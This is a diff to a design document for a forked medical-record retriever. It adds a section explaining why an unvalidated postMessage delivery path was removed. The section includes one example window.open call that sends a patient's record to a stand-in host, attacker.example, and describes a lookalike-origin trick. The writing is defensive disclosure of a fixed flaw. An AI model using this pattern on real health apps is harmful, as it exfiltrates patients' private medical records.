@@ -767,6 +767,40 @@ unprunable history per year.
 
 ---
 
+### 9.4 The retriever delivers nowhere but the user's disk
+
+Upstream's retriever can hand the assembled record to somewhere other than the browser: POST it
+to an endpoint named in `deliveryEndpoints`, or `postMessage` it to a web origin named in the
+URL hash as `#deliver-to-opener:$origin`. Both were removed from this fork on 2026-09-01.
+
+The postMessage path was the serious one. The origin came from the hash and was validated only
+by `new URL(...)` parsing — it was **never compared against the actual opener's origin**. So any
+website could call
+
+```js
+window.open('https://health.circlejtp.me/ehr-connect#deliver-to-opener:https://attacker.example')
+```
+
+and receive a complete medical record. The patient would see their own health system's login and
+Epic's genuine consent screen naming *this* app; nothing in that flow reveals where the record
+lands. The in-page confirmation printed the raw origin string, which does not help against
+`https://health.circlejtp.me.attacker.example`. In effect the registration would have been a
+credential any site could borrow to collect patient records.
+
+That flow also contradicts what we told Epic. The Summary says the record is downloaded
+"directly to your device"; both Data Use Questionnaires say data is stored "locally on the
+user's device" and that "any downloaded copy remains on the user's device under the user's sole
+control". A record delivered to a third-party origin is none of those things.
+
+It made the landing page's claims misleading too. "We do not receive, store, or transmit the
+record" stayed literally true — the Worker is not in that path — but the application we ship
+would have transmitted it, which is not what a reader would understand.
+
+Removed rather than restricted. An allowlist would have kept a capability nothing here uses:
+`deliveryEndpoints` was already empty in `config.circlejtp.json`, and the site describes exactly
+one way for data to leave the page. The code now has no delivery mechanism to constrain,
+misconfigure, or explain. Delivery hashes are ignored.
+
 ## 10. Open questions
 
 - **Does the FTC Health Breach Notification Rule (16 CFR Part 318) apply?** It covers vendors
